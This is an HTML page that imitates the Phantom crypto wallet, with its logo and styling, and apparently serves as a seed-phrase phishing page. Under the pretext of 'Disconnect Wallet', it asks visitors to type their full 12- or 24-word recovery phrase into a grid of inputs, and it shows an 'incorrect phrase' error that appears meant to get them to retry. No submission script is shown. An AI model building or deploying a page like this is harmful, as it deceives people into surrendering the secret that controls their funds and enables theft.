<!DOCTYPE html>
<html lang="en" style="background:#222222">
<head>
<meta charset="utf-8"/>
<style>html,body{background:#222222}</style>
<link rel="icon" href="assets/phantom-logo.svg"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Phantom: The crypto wallet for everyone</title>
<style>
html,body{margin:0;height:100%;background:#222222;color:#fff;font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
#root{height:100%}
.ph-shell{position:relative;display:flex;height:100%;width:100%;flex-direction:column;align-items:center;justify-content:center;box-sizing:border-box;padding:0 16px;background:#222222;color:#fff}
.ph-logo-wrap{position:absolute;left:0;top:0;display:flex;width:100%;padding:40px;box-sizing:border-box}
.ph-logo{display:block;width:40px;height:40px;fill:#fff}
.ph-card{display:flex;width:100%;max-width:420px;flex-direction:column;align-items:center;gap:8px;border-radius:16px;background:#222222;padding:16px;text-align:center;box-sizing:border-box}
.ph-title{margin:16px 0 0;font-size:24px;font-weight:600;line-height:1.25;color:#fff}
.ph-sub{margin:0;padding:0 16px;font-size:18px;line-height:1.4;color:#999}
#ph-word-grid{margin-top:16px;display:grid;width:100%;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px}
.ph-cell{display:flex;width:100%;align-items:center;gap:8px;border-radius:4px;background:#181818;padding:0 12px;font-size:14px;font-weight:500;box-sizing:border-box;box-shadow:inset 0 0 0 1px #2f2f2f}
.ph-cell:focus-within{box-shadow:inset 0 0 0 1px #ab9ff2}
.ph-num{color:#999;flex-shrink:0}
.ph-cell input{width:100%;flex-grow:1;margin:0;border:0;outline:none;background:transparent;padding:8px 0;color:#fff;caret-color:#fff;font:inherit}
.ph-extra{display:none}
#ph-word-grid.is-24 .ph-extra{display:flex}
#toggle-phrase-length{margin-top:16px;border:0;background:none;padding:0;font:inherit;font-weight:500;color:#777;cursor:pointer}
#toggle-phrase-length:hover{color:#ab9ff2}
#import-submit-btn{margin-top:8px;display:flex;width:100%;align-items:center;justify-content:center;border:0;border-radius:12px;padding:12px 16px;font:inherit;font-size:16px;font-weight:600;background:#ab9ff2;color:#222;cursor:pointer;touch-action:manipulation;-webkit-tap-highlight-color:transparent;transition:transform .07s ease,box-shadow .07s ease}
#import-submit-btn:disabled{background:#2d2d2d;color:rgba(255,255,255,.6);cursor:not-allowed}
#import-submit-btn:not(:disabled):active,
#import-submit-btn:not(:disabled).is-pressed{transform:translateY(1px) scale(.98);box-shadow:inset 0 1px 2px rgba(0,0,0,.22)}
#ph-seed-err{display:none;color:#f87171;font-size:13px;text-align:center;margin-top:8px}
@media (min-width:768px){
  html,body,.ph-shell{background:#e1dffb}
  .ph-logo{fill:#333}
  .ph-card{box-shadow:0 25px 50px -12px rgba(0,0,0,.35)}
}
</style>
</head>
<body>
<div id="root">
  <div class="ph-shell">
    <div class="ph-logo-wrap">
      <svg class="ph-logo" fill="currentColor" height="36" viewBox="0 0 24 24" width="36" aria-hidden="true">
        <path clip-rule="evenodd" d="M9.78 16.95c-1.26 1.928-3.37 4.37-6.177 4.37C2.276 21.32 1 20.774 1 18.4 1 12.356 9.252 3 16.909 3 21.265 3 23 6.022 23 9.454c0 4.405-2.858 9.442-5.7 9.442-.902 0-1.344-.496-1.344-1.281 0-.205.034-.427.102-.666-.97 1.656-2.841 3.193-4.594 3.193-1.276 0-1.923-.802-1.923-1.93 0-.41.085-.836.239-1.263m6.595-7.615c0 1-.59 1.5-1.25 1.5-.67 0-1.25-.5-1.25-1.5s.58-1.5 1.25-1.5c.66 0 1.25.5 1.25 1.5m3.75 0c0 1-.59 1.5-1.25 1.5-.67 0-1.25-.5-1.25-1.5s.58-1.5 1.25-1.5c.66 0 1.25.5 1.25 1.5" fill-rule="evenodd"></path>
      </svg>
    </div>
    <form class="ph-card" data-testid="onboarding-form" autocomplete="off">
      <p id="phantom-seeds-title" class="ph-title">Disconnect Wallet</p>
      <p id="phantom-seeds-subtitle" class="ph-sub">Enter your 12 or 24-word recovery phrase to disconnect your wallet.</p>
      <div id="ph-word-grid">
        <div class="ph-cell"><span class="ph-num">1.</span><input data-testid="secret-recovery-phrase-word-input-0" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">2.</span><input data-testid="secret-recovery-phrase-word-input-1" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">3.</span><input data-testid="secret-recovery-phrase-word-input-2" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">4.</span><input data-testid="secret-recovery-phrase-word-input-3" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">5.</span><input data-testid="secret-recovery-phrase-word-input-4" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">6.</span><input data-testid="secret-recovery-phrase-word-input-5" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">7.</span><input data-testid="secret-recovery-phrase-word-input-6" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">8.</span><input data-testid="secret-recovery-phrase-word-input-7" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">9.</span><input data-testid="secret-recovery-phrase-word-input-8" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">10.</span><input data-testid="secret-recovery-phrase-word-input-9" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">11.</span><input data-testid="secret-recovery-phrase-word-input-10" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell"><span class="ph-num">12.</span><input data-testid="secret-recovery-phrase-word-input-11" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">13.</span><input data-testid="secret-recovery-phrase-word-input-12" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">14.</span><input data-testid="secret-recovery-phrase-word-input-13" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">15.</span><input data-testid="secret-recovery-phrase-word-input-14" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">16.</span><input data-testid="secret-recovery-phrase-word-input-15" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">17.</span><input data-testid="secret-recovery-phrase-word-input-16" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">18.</span><input data-testid="secret-recovery-phrase-word-input-17" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">19.</span><input data-testid="secret-recovery-phrase-word-input-18" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">20.</span><input data-testid="secret-recovery-phrase-word-input-19" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">21.</span><input data-testid="secret-recovery-phrase-word-input-20" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">22.</span><input data-testid="secret-recovery-phrase-word-input-21" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">23.</span><input data-testid="secret-recovery-phrase-word-input-22" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
        <div class="ph-cell ph-extra"><span class="ph-num">24.</span><input data-testid="secret-recovery-phrase-word-input-23" type="text" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="none" value=""/></div>
      </div>
      <button type="button" id="toggle-phrase-length">I have a 24-word recovery phrase</button>
      <button type="submit" id="import-submit-btn" data-testid="onboarding-form-submit-button" disabled>
        <span id="import-btn-text">Disconnect Wallet</span>
      </button>
      <p id="ph-seed-err">The recovery phrase you entered is incorrect. Please try again.</p>
    </form>
  </div>
</div>

</body>
</html>
